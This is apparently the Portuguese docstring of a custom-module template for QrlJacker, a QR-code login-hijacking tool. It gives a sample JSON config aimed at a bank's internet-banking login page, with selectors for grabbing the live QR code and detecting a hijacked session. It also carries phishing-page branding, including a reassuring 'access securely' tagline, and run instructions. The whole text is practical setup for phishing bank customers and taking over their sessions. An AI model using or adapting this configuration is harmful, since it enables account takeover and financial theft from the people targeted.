# -*- coding: utf-8 -*-
"""Modelo de módulo personalizado (carregado com --module-file).

Salve um JSON como o exemplo abaixo e rode:
    python QrlJacker.py --module-file meu_alvo.json

Exemplo:
{
  "name": "meubanco",
  "url": "https://ib.meubanco.com.br/login",
  "qr_selectors": ["canvas", "img.qr"],
  "success_selectors": ["#dashboard"],
  "success_url_contains": ["/dashboard"],
  "pre_click_xpath": ["//button[contains(., 'QR')]"],
  "browser": "auto",
  "phishing": {
    "TITLE": "Meu Banco",
    "COLOR": "#0055a5",
    "TAGLINE": "Acesse sua conta com segurança.",
    "FOOTER": "Nunca compartilhe seu código com estranhos.",
    "REFRESH_MS": "2500"
  }
}

Dicas:
- qr_selectors: o framework tenta na ordem; se nenhum casar, usa a
  heurística do "maior quadrado visível" (canvas/img).
- success_selectors / success_url_contains: definem quando a sessão foi
  estabelecida (elemento presente OU URL contém o fragmento).
- pre_click_xpath: botões a clicar para chegar à tela do QR.
- Sempre teste primeiro com --once e --visible para conferir a captura.
"""
